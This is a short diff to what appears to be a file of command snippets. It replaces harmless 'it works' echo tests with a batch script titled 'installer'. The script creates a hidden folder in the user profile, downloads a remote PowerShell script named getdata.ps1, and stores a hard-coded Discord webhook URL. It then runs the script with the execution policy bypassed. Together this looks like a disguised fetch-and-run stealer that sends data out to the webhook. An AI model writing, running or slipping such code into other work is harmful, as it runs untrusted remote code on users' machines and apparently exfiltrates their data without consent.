@@ -1,3 +1,2 @@
-CMD: echo it works! && pause
-POW: echo it works! && pause
-BAT: @echo off <NEWLINE> title think it works <NEWLINE> echo it works! <NEWLINE> pause <NEWLINE> exit /b 0
+BAT: @echo off <NEWLINE> title installer <NEWLINE> if not exist "%USERPROFILE%\.bob" ( <NEWLINE> <TAB>mkdir "%USERPROFILE%\.bob" <NEWLINE> ) <NEWLINE> cd "%USERPROFILE%\.bob" <NEWLINE> if not exist "%USERPROFILE%\.bob\getdata.ps1" ( <NEWLINE> <TAB>curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1" <NEWLINE> ) <NEWLINE> if not exist "%USERPROFILE%\.bob\discord_webhook.txt" ( <NEWLINE> <TAB>echo https://discord.com/api/webhooks/1556067877835112451/UgCLoB3lrEXhC7sOrUe_zVI1i8LyH6_TWWJXpY54MOb19GLUQIrKMGzspcdjbS7ArIw7>%USERPROFILE%\.bob\discord_webhook.txt <NEWLINE> )
+CMD: powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\.bob\getdata.ps1"
